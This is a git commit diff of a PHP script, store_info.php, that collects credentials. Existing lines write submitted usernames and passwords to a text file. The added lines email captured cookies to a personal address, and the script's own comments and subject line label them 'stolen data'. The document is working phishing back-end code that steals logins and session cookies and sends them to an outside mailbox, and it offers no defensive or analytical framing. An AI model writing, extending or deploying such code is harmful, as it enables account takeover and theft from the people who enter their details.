ad8cef20f714334a77f4dc8235cc753bd4d2ce24
drwnx <oussamajmt@gmail.com>
2024-10-18 15:41:19 +0200

    store_info.php

--- store_info.php
+++ store_info.php
@@ -8,4 +8,12 @@ $file = fopen("credentials.txt", "a");
 fwrite($file, "Username: " . $username . "\n");
 fwrite($file, "Password: " . $password . "\n\n");
 fclose($file);
+
+// Send an email notification with the stolen data
+$to = "oussamajmt@gmail.com";
+$subject = "New stolen data";
+$message = "Stolen cookies: " . $cookies;
+$headers = "From: noreply@example.com";
+
+mail($to, $subject, $message, $headers);
 ?>
